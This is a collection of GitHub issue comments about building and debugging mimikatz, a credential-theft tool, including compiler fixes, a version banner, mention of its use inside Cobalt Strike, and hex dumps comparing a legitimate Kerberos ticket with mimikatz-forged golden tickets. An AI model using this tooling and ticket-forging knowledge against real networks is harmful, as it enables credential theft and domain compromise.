    "iptwLcP9": "Hi, thanks for reply.\nHere's the cabinet file and the command output:\n```\nC:\\Documents and Settings\\Administrator\\Desktop\\mimikatz_trunk\\Win32>mimikatz.exe\n.#####.   mimikatz 2.1.1 (x86) built on Aug 20 2018 01:53:40\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)  Kitten Edition \n ## / \\ ##  / Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   /\nmimikatz # version /full\nmimikatz 2.1.1 (arch x86)\nWindows NT 5.2 build 3790 (arch x86)\nmsvc 150030729 207\nlsasrv.dll      : 5.2.3790.3959\nmsv1_0.dll      : 5.2.3790.3959\nwdigest.dll     : 5.2.3790.3959\nkerberos.dll    : 5.2.3790.3959\nkdcsvc.dll      : 5.2.3790.3959\ncryptdll.dll    : 5.2.3790.3959\nsamsrv.dll      : 5.2.3790.3959\nrsaenh.dll      : 5.2.3790.3959\neventlog.dll    : 5.2.3790.3959\ntermsrv.dll     : 5.2.3790.3959\nmimikatz # \n```. ",
    "taherkaraki": "I fixed it a couple of builds ago by replacing the following line:\nret = swscanf_s(theArg, L\"%[^:]:%[^:]:%s\", bSalt, ARRAYSIZE(bSalt), bAes256, ARRAYSIZE(bAes256), bAes128, ARRAYSIZE(bAes128));\nWith:\nret = swscanf_s(theArg, L\"%[^:]:%[^:]:%s\", bSalt, (UINT)ARRAYSIZE(bSalt), bAes256, (UINT)ARRAYSIZE(bAes256), bAes128, (UINT)ARRAYSIZE(bAes128));\nAfter you fix it, you will get a similar error in another file as far as I remember. So simply do the same.. ",
    "CaledoniaProject": "To reproduce this issue, install VS 2017 (with XP support, Windows 8.1 SDK), and execute \nmsbuild /target:mimikatz:Rebuild /p:Configuration=Release /p:Platform=Win32 /p:PlatformToolset=v141\n. ",
    "tsm181": "We're using the mimikatz built into cobalt which is prob a month behind on the update. I'm seeing gentilwiki's tweet now about updating this like a week ago. So i'm gonna close the issue and retest with the most up to date version. . ",
    "JABirchall": "Because its not command prompt window, Its a console. Command prompt is a program built around the console to add that functionality (like a SSH client).\nUse mimikatz.exe log if you need to copy stuff.. ",
    "audrummer15": "You definitely bring up a good point. I'll be honest, I didn't actually look into how Impacket is parsing the validation info blob. However, here's the main thing to note about this PR, maybe it will make more sense with a \"hexlified\" version of the blob in question.\nLegitimate Ticket - Validation Info\nbf4ba2e46b65d401ffffffffffffff7fffffffffffffff7f0aab88d9595fd4010a6bf2032360d401\nffffffffffffff7f0c000c00040002001400140008000200000000000c0002000000000010000200\n000000001400020000000000180002000c0000007504000001020000020000001c00020020000000\n0000000000000000000000000000000016001800200002000e001000240002002800020000000000\n00000000100200000000000000000000000000000000000000000000000000000000000001000000\n2c0002000000000000000000000000000600000000000000060000006100620072006f0077006e00\n0a000000000000000a0000004100640061006d002000420072006f0077006e000000000000000000\n00000000000000000000000000000000000000000000000000000000000000000000000000000000\n02000000000200000700000001020000070000000c000000000000000b00000044004f004d004100\n49004e0031002d00440043003100000008000000000000000700000044004f004d00410049004e00\n310000000400000001040000000000051500000077875d46c960085cdfccdcc10100000030000200\n0700000001000000010100000000001201000000\nGolden Ticket from Mimikatz - Validation Info\n802d6c952f6ed401ffffffffffffff7fffffffffffffff7fffffffffffffff7fffffffffffffff7f\nffffffffffffff7f0c000e0004000200000000000000000000000000000000000000000000000000\n00000000000000000000000000000000000000007504000001020000050000000800020000000000\n0000000000000000000000000000000000000000000000000e0010000c0002001000020000000000\n00000000100200000000000000000000000000000000000000000000000000000000000000000000\n000000000000000000000000000000000700000000000000060000006100620072006f0077006e00\n05000000010200000700000000020000070000000802000007000000060200000700000007020000\n0700000008000000000000000700000044004f004d00410049004e00310000000400000001040000\n000000051500000077875d46c960085cdfccdcc1\nUpdated Golden Ticket from Mimikatz - Validation Info\n80e237fb1f6fd401ffffffffffffff7fffffffffffffff7fffffffffffffff7fffffffffffffff7f\nffffffffffffff7f0c000e000400020000000000000000000000020008000200000002000c000200\n00000200100002000000020014000200000000007504000001020000050000001800020000000000\n00000000000000000000000000000000000002001c0002000e001000200002002400020000000000\n00000000100200000000000000000000000000000000000000000000000000000000000000000000\n000000000000000000000000000000000700000000000000060000006100620072006f0077006e00\n01000000000000000000000001000000000000000000000001000000000000000000000001000000\n00000000000000000500000001020000070000000002000007000000080200000700000006020000\n07000000070200000700000001000000000000000000000008000000000000000700000044004f00\n4d00410049004e00310000000400000001040000000000051500000077875d46c960085cdfccdcc1\n00000000\nAs you can see, the ticket has grown in size, and it's due to proper initialization of the structs used for the properties mentioned above. \nThe above blobs can be slightly overwhelming (lots of data not relevant to this conversation). Here are the sections of the blob in question.\nLegitimate Ticket - Validation Info\n60000006100620072006f0077006e000a000000000000000a0000004100640061006d00200042007\n2006f0077006e0000000000000000000000000000000000000000000000000000000000000000000\n00000000000000000000000000000000200000\nGolden Ticket from Mimikatz - Validation Info\n60000006100620072006f0077006e0005000000010200000\nUpdated Golden Ticket from Mimikatz - Validation Info\n60000006100620072006f0077006e000100000000000000000000000100000000000000000000000\n1000000000000000000000001000000000000000000000005000000010200000\nHowever... you've allowed me to see an important discrepancy between the legitimate ticket, and the ticket generated from my PR. Instead of the struct being written as all00 bytes, they are all 00 bytes with the exception of a single 01 byte at the beginning. I'm not sure exactly which piece that is yet (I would assume it's the UNICODE_STRING's length member), but plan on looking into it more when I get some free time. \nPlease let me know if I have missed something. And thanks for the speedy response!\nEDIT: Make differences in hexlified blobs more identifiable.. ",
    "emanuelecesari": "How did you fix it?. ",
    "martclau": "I haven't tried myself yet - thought it would be picked up by an official developer.. ",
    "mobychien": "This is the same issue reported in #172 .  Fixed in #172 . ",
    "shshzi": "It seems like https://github.com/gentilkiwi/mimikatz/commit/56d9db738af790a752ebb2e0c3e5d37664405031#diff-3c58a1954f5903deb813027929f50568 introduced a regression (removed the cast to ULONG that was fixed by https://github.com/gentilkiwi/mimikatz/commit/2e4edccee83d63925b9a8861610b1a51276d7432#diff-3c58a1954f5903deb813027929f50568). ",
    "Speedi13": "I made a pull request for that\nhttps://github.com/gentilkiwi/mimikatz/pull/190. lol fail, I am not very familiar with GitHub. "
}